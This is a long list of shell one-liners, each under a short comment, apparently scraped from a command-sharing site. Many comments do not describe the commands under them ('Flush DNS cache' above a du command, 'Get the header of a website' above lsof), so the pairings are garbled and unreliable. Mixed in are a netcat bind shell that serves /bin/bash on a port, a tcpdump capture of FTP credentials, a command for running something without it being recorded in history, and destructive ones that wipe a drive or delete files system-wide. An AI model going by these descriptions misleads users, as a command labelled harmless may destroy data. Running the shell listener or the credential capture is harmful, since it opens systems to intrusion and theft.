# Is it a terminal?
isatty(){ test -t $1; }
# Get the size of all the directories in current directory
du -hd 1
# Recursively lists all files in the current directory, except the ones in '.snapshot' directory
find . -wholename './.snapshot' -prune -o -print
# List the CPU model name
grep "model name" /proc/cpuinfo
# Massive change of file extension (bash)
for file in *.txt; do mv "$file" "${file%.txt}.xml"; done
# left-right mouse buttons (left-handed)
tr : \\n <<<$PATH
# Send a backup job to a remote tape drive on another machine over SSH
tar cvzf - /directory/ | ssh root@host "cat > /dev/nst0"
# Better git diff, word delimited and colorized
git config alias.dcolor "diff --color-words"
# Display two calendar months side by side
cal -3
# Go to the next sibling directory in alphabetical order, version 2
cd ../"$(ls -F ..|grep '/'|grep -A1 `basename $PWD`|tail -n 1)"
# dstat- this command is powerful one to monitor system activity . It has combined the power of vmstat,iostat,mpstat,df,free,sar .
dstat -afv
# To get  internet connection information .
sudo /bin/netstat -tpee
# replace XX by YY in the the current directory and cd to it. ( in ZSH )
cd XX YY
# Change the extension of a filename by using rename to convert
rename .JPG .jpg *.JPG
# Show the command line for a PID with ps
ps h -o %a 21679
# lotto generator
shuf -i 1-49 -n 6 | sort -n | xargs
# load changes without logging in and out vim
:source ~/.vimrc
# Archive a directory with datestamp on filename
tar zcvf somedir-$(date +%Y%m%d-%H%M).tar.gz somedir/
# prints the parameter you used on the previous command
<alt+.>
# Watch the size of a directory using figlet
watch -n1 "du -hs /home/$USER | cut -f1 -d'/' | figlet -k"
# Efficiently extract lines between markers
sed -n '/START/,${/STOP/q;p}'
# calulate established tcp connection of local machine
netstat -an|grep -ci "tcp.*established"
# Add a line to a file using sudo
echo "foo bar" | sudo tee -a /path/to/some/file
# Create a tar file with the current date in the name.
tar cfz backup-$(date --iso).tar.gz somedirs
# Generate soothing noise
/usr/bin/play -q -n synth brown band -n 1200 200 tremolo 0.05 80
# Check ps output to see if file is running, if not start it
ps -C thisdaemon || { thisdaemon & }
# Displaying system temperature
cat /proc/acpi/thermal_zone/THRM/temperature
# find and delete files smaller than specific size
find . -type f -size -80k -delete
# Verify if user account exists in Linux / Unix
id <username>
# Converts uppercase chars in a string to lowercase
s="StrinG"; echo ${s,,}
# Output sound when your computer is downloading something
tcpdump | aplay -c 2
# SMS reminder
echo 'mail -s "Call your wife" 13125551234@tmomail.net' |at now+15min
# Compare a remote dir with a local dir
diff -y <(ssh user@host  find /boot|sort) <(find /boot|sort)
# grep certain file types recursively
find . -name "*.[ch]" | xargs grep "TODO"
# Generat a Random MAC address
hexdump -n6 -e '/1 ":%02X"' /dev/random|sed s/^://g
# Batch file name renaming (copying or moving) w/ glob matching.
for x in *.ex1; do mv "${x}" "${x%ex1}ex2"; done
# Check disk I/O
iostat -d -x 10 5
# Tail a log file with long lines truncated
tail -f logfile.log | cut -b 1-80
# extract content of a Debian package
ar -x package.deb
# Never rewrites a file while copying (or moving)
cp --backup=t source.file target.file
# Output system statistics every 5 seconds with timestamp
while [ 1 ]; do echo -n "`date +%F_%T`" ; vmstat 1 2 | tail -1 ; sleep 4; done
# View a colorful logfile using less
< /var/log/syslog ccze -A | less -R
# port scan using parallel
seq 1 255 | parallel -j+0 'nc -w 1 -z -v 192.168.1.{} 80'
# xargs for builtin bash commands
bargs { while read i; do "$@" "$i"; done }
# put current directory in LAN quickly
python -m SimpleHTTPServer
# Encode/Decode text to/from Base64 on a Mac w/out Mac Ports
openssl base64 -in base64.decoded.txt -out base64.encoded.txt
# Use top to monitor only all processes with the same name fragment 'foo'
top '-p' $(pgrep -d ' -p ' foo)
# Command to rename multiple file in one go
for f in ./*.xls; do mv "$f" "${f%.*}.ods"; done
# Break lines after, for example 78 characters, but don't break within a word/string
fold -w 78 -s file-to-wrap
# Delete all but the latest 5 files
ls -t | tail +6 | xargs rm
# Delete all local git branches that have been merged
git branch --merged | grep -v "\*" | xargs -n 1 git branch -d
# list with full path
printf "$PWD/%s\n" *
# Print a monthly calendar with today's date highlighted
cal | grep -E --color "\b`date +%e`\b|$"
# Create an ISO Image from a folder and burn it to CD
quietly() { "$@" > /dev/null 2>&1; }
# List only the directories
tree -dL 1
# Shows physically connected drives (SCSI or SATA)
ls /sys/bus/scsi/devices
# Stop long commands wrapping around and over-writing itself in the Bash shell
shopt -s checkwinsize
# A function to find the newest file in a directory
newest () { find ${1:-\.} -type f |xargs ls -lrt ; }
# Print the IPv4 address of a given interface
ip a s eth0 | awk -F'[/ ]+' '/inet[^6]/{print $3}'
# Switch to the previous branch used in git(1)
git checkout -
# Generate Sha1, MD5 hash using echo
echo -n "password"|md5sum|awk '{print $1}'
# dump database from postgresql to a file
pg_dump -Ft -b -Uusername -hdb.host.com db_name > db.tar
# Browse shared folder when you're the only Linux user
xev
# Quickly build ulimit command from current values
echo "ulimit `ulimit -a|sed -e 's/^.*\([a-z]\))\(.*\)$/-\1\2/'|tr "\n" ' '`"
# Numeric zero padding file rename
ls *.jpg | awk -F'.' '{ printf "%s %04d.%s\n", $0, $1, $2; }' | xargs -n2 mv
# External IP (raw data)
dig +short myip.opendns.com @resolver1.opendns.com
# Decode a MIME message
date +%A | tail -2c
# Find
convert image123.png -colors 14 -resize 640x480 grubimg.xpm
# Rsync files with spaces
rsync [options] -- * target
# Merge files, joining each line in one line
paste file1 file2 fileN > merged
# Debug bash shell scripts.
bash -x SCRIPT
# Get a shell with a not available account
su - <user> -s /bin/sh -c "/bin/sh"
# Determine whether a CPU has 64 bit capability or not
ldconfig -p
# Set an alarm to wake up
sleep 5h && rhythmbox path/to/song
# Create and access directory at the same time
mkdir [[folder]] && cd $_
# get partitions that are over 50% usage
df -h |awk '{a=$5;gsub(/%/,"",a);if(a > 50){print $0}}'
# Get a diff of two json arrays
diff <(jq . -M -S < old.json) <(jq . -M -S < new.json)
# Print stack trace of a core file without needing to enter gdb interactively
alias gdbbt="gdb -q -n -ex bt -batch"
# write by vim need root privilege
!w sudo tee %
# Symlink all files from a base directory to a target directory
for f in $(ls -d /base/*); do ln -s $f /target; done && ls -al /target
# make 100 directories with leading zero, 001...100, using bash3.X
mkdir $(printf '%03d\n' {1..100})
# converting horizontal line to vertical line
tr '\t' '\n' < inputfile
# Lookup hostname for IP address
dig +short -x <ip-address>
# Most simple way to get a list of open ports
netstat -lnp
# List all users and groups
groups $(cut -f1 -d":" /etc/passwd) | sort
# Insert a line at the top of a text file without sed or awk or bash loops
echo "New first line" | cat - file.txt > newfile.txt; mv newfile.txt file.txt
# convert wav files to flac
flac --best *.wav
# send file to remote machine and unzip using ssh
ssh user@host 'gunzip - > file' < file.gz
# Unmount all CIFS drives
umount -a -t cifs
# To have only unique lines in a file
sort file1.txt | uniq > file2.txt
# Convert df command to posix; uber GREPable
df -P
# spawn shell listener service with nc
nc -l -p 3003 -e /bin/bash
# list all hd partitions
awk '/d.[0-9]/{print $4}' /proc/partitions
# using tee to echo to a system file with sudo privileges
echo ondemand | sudo tee /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor
# floating point operations in shell scripts
bc -l <<< s(3/5)
# Watch command
watch -n 2 command
# Uniformly correct filenames in a directory
for i in  *;do mv "$i" "$(echo $i | sed s/PROBLEM/FIX/g)";done
# Compare two files side-by-side
sdiff file1 file2
# Sort processes by CPU Usage
ps aux | sort -rk 3,3 | head -n 10
# Emptying a text file in one shot
:1,$d
# Lists the supported memory types and how much your board can support.
printf "%'d\n" 1234567
# list all opened ports on host
sudo lsof -P -i -n -sTCP:LISTEN
# replace strings in file names
rename 's/foo/bar/g' foobar
# Console clock
while [[ 1 ]] ; do clear; banner `date +%H:%M:%S` ; sleep 1; done
# Display the inodes number of /
tree -a -L 1 --inodes /
# List all TCP opened ports on localhost in LISTEN mode
netstat -nptl
# Show all symlinks
find ./ -type l -ls
# Find the ratio between ram usage and swap usage.
sysctl -a | grep vm.swappiness
# Word-based diff on reformatted text files
diff -uw <(fmt -1 {file1, file2})
# List of macros defined by gcc
gcc -dM -E - </dev/null
# Restart openssh-server on your Synology NAS from commandline.
ip link | awk '/link/ {print $2}'
# Define a quick calculator function
=() { echo $(($*)); }
# Clear your history saved into .bash_history file!
history -c
# Delete C style comments using vim
vim suite.js -c '%s!/\*\_.\{-}\*/!!g'
# Alias for lazy tmux create/reattach
alias ltmux="if tmux has; then tmux attach; else tmux new; fi"
# Edit all files found having a specific string found by grep
grep -Hrli 'foo' * | xargs vim
# Clear your history saved into .bash_history file!
history -c && rm -f ~/.bash_history
# count how many cat processes are running
ps ax | grep -c [c]at
# Flush DNS cache in MacOS 10.5
du -ms * .[^.]*| sort -nk1
# run command on a group of nodes in parallel redirecting outputs
xargs -n1 -P100 -I{} sh -c 'ssh {} uptime >output/{} 2>error/{}' <hostlist
# get function's source
typeset -f <function name>; declare -f <function name>
# To get the CPU temperature continuously on the desktop
while :; do acpi -t | osd_cat -p bottom ; sleep 1; done &
# Lists all clients of a Squid proxy
cut -c23-37 /var/log/squid3/access.log | cut -d' ' -f1 | sort | uniq
# Compress blank lines in VIM
:g/^\s*$/,/\S/-j|s/.*//
# Command to Show a List of Special Characters for bash prompt (PS1)
alias PS1="man bash | sed -n '/ASCII bell/,/end a sequence/p'"
# Random file naming
mv file.png  $( mktemp -u | cut -d'.' -f2 ).png
# Change SSH RSA passphrase
ssh-keygen -f ~/.ssh/id_rsa -p
# Find Out My Linux Distribution Name and Version
cat /etc/*-release
# gzip over ssh
ssh 10.0.0.4 "cat /tmp/backup.sql | gzip -c1" | gunzip -c > backup.sql
# Clone current directory into /destination verbosely
find . | cpio -pumdv /destination
# Show numerical values for each of the 256 colors in ZSH
for code in {000..255}; do print -P -- "$code: %F{$code}Test%f"; done
# Monitor a file with tail with timestamps added
tail -f file |xargs -IX printf "$(date -u)\t%s\n" X
# copy last command to clipboard
echo "!!" | pbcopy
# Print random emoji in terminal
printf "\U$(printf '%x' $((RANDOM%79+128512)) )"
# Count all conections estabilished on gateway
cat /proc/net/ip_conntrack | grep ESTABLISHED | grep -c -v ^#
# Extract raw URLs from a file
egrep -ie "<*HREF=(.*?)>" index.html | cut -d "\"" -f 2 | grep ://
# Find broken symlinks
find . -type l -xtype l
# find listening ports by pid
lsof -nP +p 24073 | grep -i listen | awk '{print $1,$2,$7,$8,$9}'
# Take a screenshot of a login screen
chvt 7 ; sleep 2 ; DISPLAY=:0.0 import -window root screenshot.png
# recursive remove all htm files
find . -type f -name '*.htm' -delete
# Sort processes by CPU Usage
ps auxk -%cpu | head -n10
# github push-ing behind draconian proxies!
git remote add origin git@SSH-HOST:<USER>/<REPOSITORY>.git
# Export log to html file
cat /var/log/auth.log | logtool -o HTML > auth.html
# Scan for new SCSI devices
echo "- - -" > /sys/class/scsi_host/host0/scan
# Scan Subnet for IP and MAC addresses
nmap -sP 192.168.1.0/24
# Get file access control list
getfacl /mydir
# make pgsql backup and gzip it
pg_dump otrs2 | gzip > dump.gz
# Poor's man Matrix script
while (true) ; do pwgen 1 ; done
# Get the IP address
ip -f inet a | awk '/inet / { print $2 }'
# Batch File Rename with awk and sed
ls foo*.jpg | awk '{print("mv "$1" "$1)}' | sed 's/foo/bar/2' | /bin/sh
# Display time of accounts connection on a system
ac -p
# a function to put environment variable in zsh history for editing
function eve (); { eval "print -s ${1?no variable}=\'\$$1\'" }
# Start a quick rsync daemon for fast copying on internal secure network
rsync --daemon --port 1234 --no-detach -v --config rsyncd.conf
# print all except first collumn
cut -f 2- -d " "
# find out how many days since given date
for i in *.jpg; do identify -format %[EXIF:DateTimeOriginal] $i; echo; done
# Prevent non-root users from logging in
touch /etc/nologin
# Print a horizontal line
printf -v _hr "%*s" $(tput cols) && echo ${_hr// /${1--}}
# exit if another instance is running
if [ `fuser $0|wc -w` -gt "1" ];then exit; fi
# Print average GPU core temperature
nvidia-settings -q gpucoretemp -t | awk '{s+=$1}END{print s/NR}' RS=" "
# pinky -  user info
pinky -l <username>
# Rename files with vim.
qmv -fdo
# What is my public IP address
curl ifconfig.me
# Convert string to uppercase
echo string | tr '[:lower:]' '[:upper:]'
# Restore a local drive from the image on remote host via ssh
ssh user@server 'dd if=sda.img' | dd of=/dev/sda
# Show sorted list of files with sizes more than 1MB in the current dir
du | sort -nr | cut -f2- | xargs du -hs
# Find and remove core files
find . -type f -regex '.*/core\.?[0-9]*$' -delete
# Benchmark a hard drive
sudo hdparm -Tt /dev/sda
# Remove blank lines
sed '/^$/d'
# make directory with current date
mkdir $(date +%Y_%m_%d)
# Remount an already-mounted filesystem without unmounting it
mount -o remount,ro /dev/foo /
# Monitor RAID IO Usage
iotop -a -p $(sed 's, , -p ,g' <<<`pgrep "_raid|_resync|jbd2"`)
# Best SSH options for X11 forwarding
alias ssh-x='ssh -c arcfour,blowfish-cbc -XC'
# cymru malware check
md5sum filename | ncat hash.cymru.com 43
# Show current pathname in title of terminal
export PROMPT_COMMAND='echo -ne "\033]0;${PWD/#$HOME/~}\007";'
# give me back my sound card
lsof /dev/snd/pcm*p /dev/dsp | awk ' { print $2 }' | xargs kill
# draw mesh
seq -s " \\_/" 256|tr -d "0-9"|fold -70
# Edit Camera Model in metadata:
rev <<< 'lorem ipsum' | tee /dev/stderr | rev
# Quick HTML image gallery
find . -iname "*.jpg" -printf '<img src="%f" title="%f">\n' > gallery.html
# Manipulate the metadata when the photo was taken, this will shift with +15hours + 30min
awk '{print > $3".txt"}' FILENAME
# doing some floating point math
echo "8000000/(20*6*86400)" | bc -l
# Puts every word from a file into a new line
tr ' \t' '\n' <INFILE >OUTFILE
# Read aloud a text file in Ubuntu (and other Unixes with espeak installed
espeak -f text.txt
# List only directories, one per line
ls -1d */
# Delete all files by extension
find / -name "*.jpg" -delete
# To print a specific line from a file
awk 'FNR==5' <file>
# Generat a Random MAC address
od /dev/urandom -w6 -tx1 -An|sed -e 's/ //' -e 's/ /:/g'|head -n 1
# Deleting / Ignoring lines from the top of a file
sed 1d foo.txt
# Quickly move the cursor to different parts of the command line based on a mark.
ctrl-x ctrl-x
# [vim] Clear a file in three characters (plus enter)
:%d
# chroot, bind mount  without root privilege/setup
dig hostname a +short
# List only directories, one per line
find . -type d -maxdepth 1
# [vim] Clear trailing whitespace in file
:%s/\s\+$//
# replace a character/word/string in a file using vim
:%s/old/new/g
# Force hard reset on server
echo 1 > /proc/sys/kernel/sysrq; echo b > /proc/sysrq-trigger
# remove files and directories with acces time older than a given date
touch -t "YYYYMMDDhhmm.ss" dummy ; find . -anewer dummy
# Show drive names next to their full serial number (and disk info)
lsblk -do name,model,serial
# Time Synchronisation with NTP
zcat -f $(ls -tr access.log*)
# Sprunge.us - CLI alternative to PasteBin.com
grep -v rootfs /proc/mounts > /etc/mtab
# split source code to page with numbers
pr -l 40 bitree.c > printcode; split -40 printcode -d page_
# Generate the CPU utilization report
sar -u 2 5
# cooking a list of numbers for calculation
echo $( du -sm /var/log/* | cut -f 1 ) | sed 's/ /+/g'
# Selecting a random file/folder of a folder
find . | shuf -n1
# Synchronise a file from a remote server
rsync -av -e ssh user@host:/path/to/file.txt .
# Set access and modification timestamps of a file using another one as reference
touch -r "$FILE1" "$FILE2"
# List bash functions defined in .bash_profile or .bashrc
typeset -f
# mail with attachment
tar cvzf - data1 data2 | uuencode data.tar.gz | mail -s 'data' you@host.fr
# Test a serial connection
host A: cat /proc/dev/ttyS0    host B: echo hello > /dev/ttyS0
# Display Motherboard Info
$ python -u script.py
# Sum file sizes
du -scb
# Scrollable Colorized Long Listing - Hidden Files Sorted Last
less -Rf <( cat <(ls -l --color=always) <(ls -ld --color=always .*) )
# Run a command on a remote machine
ssh user@host "ps aux | grep httpd | wc -l"
# read a file line by line and perform some operation on each line
while read line; do echo "$(date),$(hostname),$line"; done < somefile.txt
# Direct auto-complete in bash
bind '"\t":menu-complete'
# coloured shell prompt
export PS1="\e[1;32m\u\e[0m@\e[1;31m\h\e[0m\e[1;33m\w:#> \e[1;32m"
# Find broken symlinks and delete them
rm **/*(-@)
# Hypnosis
for count in $(seq 2 1001); do espeak "$count sheeps";sleep 2;done
# Change the primary group of a user
usermod -g group user
# Remove all mail in Postfix mail queue.
postsuper -d ALL
# Schedule a command while one is already running.
a command is running... <^z> fg; scheduled_command
# Find all dot files and directories
ls -d .*
# Recompress all text files in a subdirectory with lzma
find . -name '*.txt' -print0 | parallel -0 -j+0 lzma
# Kick user
killall -u username
# Hypnosis
for count in $(seq 2 1001); do say "$count sheeps";sleep 2;done
# Get the number of days in a given month and year
: $(cal [$month $year]) ; echo $_
# Simple way to envoke a secure vnc session through ssh enabled router.
vncviewer -via root@your.dyndns.com 192.168.1.1
# List your MACs address
sort -u < /sys/class/net/*/address
# bash: display disks by id, UUID and HW path
tree /dev/disk
# Create a html of information about you harddisk
lshw -C disk -html > /tmp/diskinfo.html
# Alternative size (human readable) of files and directories (biggest last)
du -ms * | sort -nk1
# Replace Caps-lock with Control-key
grep  -Eo  \([0-9]\{1,3\}[\.]\)\{3\}[0-9] file | sort | uniq
# Get MD5 checksum from a pipe stream and do not alter it
tee >(openssl md5 > sum.md5) <somefile | bzip2 > somefile.bz2
# Compare two CSV files, discarding any repeated lines
cat foo.csv bar.csv | sort -t "," -k 2 | uniq
# remove lines which are longer than 255
sed -n '/^.\{255\}/!p'
# Print today's date in ISO format without calling an external command (bash 4)
today() { printf '%(%Y-%m-%d)T\n' -1; } ## bash-4
# Alias to edit and source your .bashrc file
alias vb='vim ~/.bashrc; source ~/.bashrc'
# List all symbolic links in current directory
\ls -1 | xargs -l readlink
# make directory with current date
mkdir $(date +%F)
# Show log message including which files changed for a given commit in git.
git --no-pager whatchanged -1 --pretty=medium <commit_hash>
# Count accesses per domain
cut -d'/' -f3 file | sort | uniq -c
# Get IPv4 of eth0 for use with scripts
ifconfig eth0 | grep 'inet addr' | cut -d ':' -f 2 | cut -d ' ' -f 1
# Save history without logout
history -a
# oneliner to transfer a directory using ssh and tar
tar cvzf - dir | ssh my_server 'tar xzf -'
# Show Directories in the PATH Which does NOT Exist
ls -d $(echo ${PATH//:/ }) > /dev/null
# grep -v with multiple patterns.
grep test somefile | grep -v -e error -e critical -e warning
# display systemd log entries for sshd using "no-pager"  (a bit like in pre-systemd: grep sshd /var/log/messages)
# journalctl -u sshd --no-pager # display sshd log entries
# Watch TCP, UDP open ports in real time with socket summary.
watch ss -stplu
# Flush and then immediately start watching a file
(> errors.log) && tail -f !^
# View a file with less, starting at the end of the file
less +G <filename>
# Top Command in batch mode
top -b -n 1
# Split a file one piece at a time, when using the split command isn't an option (not enough disk space)
dd if=inputfile of=split3 bs=16m count=32 skip=64
# Ping all hosts on 192.168.1.0/24
nmap -sn 192.168.1.0/24
# List all files modified by a command
D="$(date "+%F %T.%N")"; [COMMAND]; find . -newermt "$D"
# Force logout after 24 hours idle
fuser -k `who -u | awk '$6 == "old" { print "/dev/"$2'}`
# how many pages will my text files print on?
numpages() { echo $(($(wc -l $* | sed -n 's/ total$//p')/60)); }
# clear the cache from memory
sync; echo 3 > /proc/sys/vm/drop_caches
# vi a remote file with port
vi scp://username@host:12345//path/to/somefile
# Check if it's your binary birthday!
echo "obase=2;$((($(date +%s)-$(date +%s -d YYYY-MM-DD))/86400))" | bc
# Find if $b is in $a in bash
if grep -q "$b" <<<$a; then echo "'$b' was found in '$a'"; fi
# LIST FILENAMES OF FILES CREATED TODAY IN CURRENT DIRECTORY
find -maxdepth 1 -mtime 0 -type f
# Slow Down Command Output
ls -alt|awk '{if (system("sleep .5 && exit 2") != 2) exit; print}'
# Non Numeric Check
if [ -z $(echo $var | grep [0-9]) ]; then echo "NON NUMERIC"; fi
# Find if $b is in $a in bash
if [ "x${a/$b/}" != "x$a" ]; then echo "'$b' is in '$a'"; fi
# Prettify XML in pipeline
echo '<foo><bar/></foo>' | xmllint --format -
# start vim in diff mode
vimdiff file{1,2}
# grep -v with multiple patterns.
sed -n '/test/{/error\|critical\|warning/d;p}' somefile
# Fast tape rewind
< /dev/rmt/0cbn
# Find all files that have nasty names
find -name "*[^a-zA-Z0-9._-]*"
# Test disk I/O
dd if=/dev/zero of=test bs=64k count=16k conv=fdatasync
# show the difference
diff file1 file2 --side-by-side --suppress-common-lines
# Detect encoding of a text file
file -i <textfile>
# Ping all hosts on 192.168.1.0/24
ssh somemachine "cd some dir; tar zcpf - somedirname" |tar zxpf -
# Number file
nl file.txt > file_numbered.txt
# Using Git, stage all manually deleted files.
git rm $(git ls-files --deleted)
# ring the bell
alias beep='echo -en "\007"'
# Turning off display
less -X /var/log/insecure
# Sorted, recursive long file listing
lsr() { find "${@:-.}" -print0 |sort -z |xargs -0 ls $LS_OPTIONS -dla; }
# Do some learning...
gqG
# clone directory structure
cp -Rs dir1 dir2
# nmap fast scan all ports target
nmap  -p0-65535 192.168.1.254 -T5
# Stream audio over ssh ogg version
ssh [user]@[host] "ogg123 -" < [podcast].ogg
# Use default value if unassigned
ls ${my_dir:=/home}
# Limit the transfer rate of a pipe with pv
pv /dev/urandom -L 3m -i 0.3 > /dev/null
# Print every Nth line (to a maximum)
function every() { sed -n -e "${2}q" -e "0~${1}p" ${3:-/dev/stdin}; }
# copy partition table from /dev/sda to /dev/sdb
sfdisk -d /dev/sda | sed 's/sda/sdb/g' | sfdisk /dev/sdb
# List of services sorted by boot order in Redhat-based systems
find /etc/rc3.d/ | sort -g
# Convert IP octets to HEX with no dots.
myhex=$(printf '%02X' ${myip//./ };)
# Empty a file
truncate -s 0 file.txt
# Write on the console without being registered
history -d $((HISTCMD-1)) && command_to_run
# Throttle download speed (at speed x )
axel --max-speed=x
# Use a regex as a field separator awk
echo one 22 three | awk -F'[0-9][0-9]' '{print $2}'
# Get names of files in /dev, a USB device is attached to
ls -la /dev/disk/by-id/usb-*
# List all information about all files (in current dir)
ls -all
# Recursively grep thorugh directory for string in file.
grep -rni string dir
# Get IPv4 of eth0 for use with scripts
ip addr show eth0 | awk '/inet / {FS = "/"; $0 = $2; print $1}'
# Reverse a file
tac -r -s "." FILENAME
# Don't like the cut command? Tired of typing awk '{print $xxx}', try this
awp () { awk '{print $'$1'}'; }
# Root shell
sudo -i
# return external ip
curl ipinfo.io
# faster version of ls *
echo *
# Random unsigned integer
od -N 4 -t uL -An /dev/random | tr -d " "
# Sort output by column
ps aux | sort -nk 6
# Protect your eye
rndc flush
# lazy SQL QUERYING
alias QUERY='psql -h $MYDBHOST -p 5432 -d $MYDB -U $MYLOGIN --no-align'
# My Git Tree Command!
git log --graph --oneline --all
# Find broken symlinks
PERMA () { echo "$@" >> ~/.bashrc; }
# Output files without comments or empty lines
grep -v "^\($\|#\)" <filenames>
# Show what PID is listening on port 80 on Linux
netstat -alnp | grep ::80
# lazy SQL QUERYING
psql
# Dock Thunderbird in system tray and hide main window
alltray -H thunderbird
# Create Solid Archive (best compression) with  7z
du -xB M --max-depth=2 /var | sort -rn | head -n 15
# Find partition name using mount point
lsblk | grep <mountpoint>
# show current directory
ls -t | head
# Find where a kind of file is stored
find . -name '*.desktop' | sed s/[^/]*\.desktop$// | uniq -c | sort -g
# Query wikipedia over DNS
wiki() { local IFS=_; dig +short txt "${*^}".wp.dg.cx; }
# Display EPOCH time in human readable format using AWK.
$ date --date='@1268727836'
# Export MS Access mdb files to csv
mdb-export -H -I -R database.mdb table >table.sql
# Generate a random password 30 characters long
strings /dev/urandom | tr -cd '[:alnum:]' | fold -w 30 | head -n 1
# Put public IP address in a variable
ip=$(curl ip.pla1.net)
# Erase a word
<ALT> <BACKSPACE>
# pass the output of some command to a new email in the default email client
somecommand | open "mailto:?body=$(cat - | stripansi | urlencode)"
# View all images
find -iname '*.jpg' -print0 | xargs -0 feh -d
# Recursively move folders/files and preserve their permissions and ownership perfectly
cd /source/directory; tar cf - . | tar xf - -C /destination/directory
# Get CPU thermal data on MacOS
sysctl machdep.xcpm.cpu_thermal_level
# Change the default editor for modifying the sudoers list.
sudo update-alternatives --config editor
# Report full partitions from a cron
df -l | grep -e "9.%" -e "100%"
# Convert unix timestamp to date
date -d @1234567890
# Safe Delete
shred -n33 -zx file; rm file
# Insert  the  last  argument  of  the previous command
<ALT> .
# Get the header of a website
lsof -i -n | grep ESTABLISHED
# Sort IP addresses
sort -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4 /file/of/ip/addresses
# A DESTRUCTIVE command to render a drive unbootable
dd if=/dev/zero of=/dev/fd0 bs=512 count=1
# Shows size of dirs and files, hidden or not, sorted.
du --max-depth=1 -h * |sort -n -k 1 |egrep 'M|G'
# find text in a file
find . -maxdepth 1 -type f | xargs stat
# Find files and list them sorted by modification time
find -type f -print0 | xargs -r0 stat -c %y\ %n | sort
# Remove invalid key from the known_hosts file for the IP address of a host
ssh-keygen -R $(dig +short host.domain.tld)
# Display unique values of a column
awk '{ a[$2]++ } END { for (b in a) { print b } }' file
# Capture FTP Credentials and Commands
sudo tcpdump -nn -v port ftp or ftp-data
# List of all vim features
vim --version | grep -P '^(\+|\-)' | sed 's/\s/\n/g' | grep -Pv '^ ?$'
# Convert spaces in file names to underscores
rename 'y/ /_/' *
# Batch rename extension of all files in a folder, in the example from .txt to .md
for f in *.txt; do mv $f `basename $f .txt`.md; done;
# Get first Git commit hash
git rev-list --max-parents=0 HEAD
# lists files and folders in a folder
tree -i -L 1
# Get Nyan'd
tac $FILE
# Display all shell functions set in the current shell environment
builtin declare -f | command grep --color=never -E '^[a-zA-Z_]+\ \(\)'
# find out how much space are occuipied by files smaller than 1024K (sic) - improved
find dir -size -1024k -type f -print0 | du --files0-from - -bc
# disassemble binary shellcode
objdump -b binary -m i386 -D shellcode.bin
# Get info about a GitHub project
chmod -R u=rwX,g=rX,o=rX .
# df without line wrap on long FS name
df -PH|column -t
# Count number of files in a directory
ls|wc -l
# Send a file to a pastebin from STDIN or a file, with a single function
$ i=(*);echo ${i[RANDOM%(${#i[@]}+1)]]}
# Quick HTML image gallery
find . -iname '*.jpg' | sed 's/.*/<img src="&">/' > gallery.html
# resolve short urls
resolve(){ curl -Is $1 | egrep "Location" | sed "s/Location: \(.*\)/\1/g"; }
# Test your total disk IO capacity, regardless of caching, to find out how fast the TRUE speed of your disks are
time (dd if=/dev/zero of=blah.out bs=256M count=1 ; sync )
# Synchronize date and time with a server over ssh
date --set="$(ssh user@server 'date -u')"
# move contents of the current directory to the parent directory, then remove current directory.
mv * .[0-9a-Z]* ../; cd ..; rm -r $OLDPWD
# remove hostname from known_hosts
ssh-keygen -R hostname
# Output the content of your Active Directory in a CSV file
csvde -f test.csv
# grep lines containing two consecutive hyphens
grep -- -- file
# Check if *hardware* is 32bit or 64bit
grep -q '\<lm\>' /proc/cpuinfo && echo 64 bits || echo 32 bits
# a function to create a box of '=' characters around a given string.
box(){ c=${2-=}; l=$c$c${1//?/$c}$c$c; echo -e "$l\n$c $1 $c\n$l"; unset c l;}
# List files with full path
ls | sed s#^#$(pwd)/#
# cat stdout of multiple commands
cat <( command1 arg arg ) <( command2 arg ) ...
# Find common lines between two files
comm -12 FILE1.sorted FILE2.sorted > common
# Copy the currently playing song in MPD to somewhere else
split -b 1k file ; cat x* > file
# Automatically find and re-attach to a detached screen session
screen -RR
# Remove leading zeros in multiple columns with sed
sed 's/\b\(0*\)//g' filename
# Find out current working directory of a process
readlink /proc/self/cwd
# Get full from half remembered commands
apropos <part_rember> | less
# Sort contents of a directory with human readable output
du -hs * | sort -h
# monitor what processes are waiting for IO interrupts
while true; do date; ps auxf | awk '{if($8=="D") print $0;}'; sleep 1; done
# Grab IP address on machine with multiple interfaces
ip route get 8.8.8.8 2>/dev/null|grep -Eo 'src [0-9.]+'|grep -Eo '[0-9.]+'
# Copy the text from the 3rd line to the 9th line into a new file with VI
:3,9w new_file
# Annotate tail -f with timestamps
tail -f file | ts '%H:%M:%.S'
# output the contents of a file removing any empty lines including lines which contain only spaces or tabs.
sed -e '/^[<space><tab>]*$/d' somefile
# convert hex to decimal ; decimal to hex
echo 16i `echo "F" | tr '[a-f]' '[A-F]'` p | dc ; echo 16o "15" p | dc
# Split lossless audio (ape, flac, wav, wv) by cue file
shnsplit -t "%n-%t" -f <cue file> <audio file>
# Separates each frame of a animated gif file to a counted file, then appends the frames together into one sheet file. Useful for making sprite sheets for games.
convert +adjoin animatedImage.gif test.gif ; convert +append test*.gif
# Compress logs older than 7 days
find /path/to/files -type f -mtime +7 | grep -v \.gz | xargs gzip
# convert strings toupper/tolower with tr
echo "aBcDeFgH123" | tr a-z A-Z
# online MAC address lookup
openssl rsa -in key.priv -pubout > key.pub
# From Vim, run current buffer in python
! python %
# Prints a file leaving out all blank lines and comment-only lines
egrep -v "^\s*(#|$)" myfile.cfg
# Remove the first character of each line in a file
cut -c 2- < <file>
# Keep one instance of an irc chat client in a screen session
alias irc="screen -D -R -S chatclient irssi"
# Copy ssh keys to user@host to enable password-less ssh logins.
cat ~/.ssh/id_rsa.pub | ssh user@host 'cat >> ~/.ssh/authorized_keys'
# Docker: Remove all exited docker container
docker ps -aq --filter status=exited | xargs docker rm
# Running a command at a specific time
echo "notify-send TimeToQuit" | at 10:22
# Force an fsck on reboot
shutdown -rF now
# Get information about memory modules
filterous -dntb --tag Bash < bookmarks.xml
# sleep until X o'clock
sleep $((3600 - ($(date +%s) % 3600) ))
# Averaging columns of numbers
awk '{sum1+=$1; sum2+=$2} END {print sum1/NR, sum2/NR}' file.dat
# Benchmark report generator
hardinfo -am benchmark.so -f html > report.html
# Run bash on top of a vi session (saved or not saved), run multiple commands, instead of one at a time with :!(bashcommand), type exit and [enter] to get back to where you left off in vi.
:!bash
# Format partition with ext4 but without a journal
mke2fs -t ext4 -O ^has_journal /dev/sdXN
# Execute a command at a given time
echo "DISPLAY=$DISPLAY xmessage call the client" | at 10:00
# journalctl -f
journalctl -f
# Quick plotting of a function
seq 0 0.1 20 | awk '{print $1, cos(0.5*$1)*sin(5*$1)}' | graph -T X
